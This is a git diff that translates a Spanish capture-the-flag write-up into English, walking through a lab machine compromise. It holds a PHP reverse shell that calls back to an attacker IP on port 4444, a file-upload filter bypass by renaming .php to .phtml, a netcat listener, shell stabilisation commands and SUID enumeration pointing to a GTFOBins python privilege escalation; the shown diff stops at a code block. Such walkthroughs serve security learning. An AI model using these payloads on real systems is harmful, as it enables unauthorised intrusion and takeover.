@@ -39,13 +39,13 @@ http://10.128.129.128/panel
 http://10.128.129.128/uploads
 ```
 
-### Cuando vamos a /panel/ hay una opcino de subir archivos 
-### subimos reverse shell en php
+### When we navigate to /panel/ there is an option to upload files 
+### We upload a PHP reverse shell
 ```bash
 cat > rev.php << 'EOF'
 <?php
 set_time_limit(0);
-$ip = '192.168.160.214';  // Reemplaza con tu IP
+$ip = '192.168.160.214';  // Replace with your IP
 $port = 4444;
 $sock = fsockopen($ip, $port);
 $descriptorspec = array(
@@ -58,17 +58,17 @@ proc_close($process);
 ?>
 EOF
 ```
-### Al intentar subir la reverse nos indica que .php no esta perimitido 
+### When trying to upload the reverse shell, it tells us that .php is not allowed 
 ```bash
 mv rev.php rev.phtml
 ```
-### Al cambiar la extension y subir el archivo ahora si nos a dejado 
+### By changing the extension and uploading the file again, it allows it 
 ```bash
-# Para activar la rev shell 
+# To trigger the rev shell 
 nc -nlvp 4444
 curl http://$TARGET/uploads/rev.phtml
 ```
-Stabilise:
+Stabilize:
 ```bash
 # What it does: spawn an interactive bash shell using Python.
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -77,15 +77,15 @@ export TERM=xterm
 stty raw -echo; fg
 reset
 ```
-### Buscamos la flag
+### Search for the user flag
 ```bash
 find / -type f -name user.txt 2> /dev/null 
 cat /var/www/user.txt
 ```
 
-## Priviesc
+## Privesc
 
-### buscamos suid
+### Look for SUID binaries
 ```bash
 find / -perm -u=s -type f 2>/dev/null
 ```
@@ -98,7 +98,7 @@ find / -perm -u=s -type f 2>/dev/null
 /usr/bin/at
 ```
 
-### Vemos que python tiene permisos suid , Buscamos en gtfoBin como escalar privilegios 
+### We see that python has SUID permissions. We search GTFOBins for how to escalate privileges 
 https://gtfobins.org/gtfobins/python/
 
 ```bash
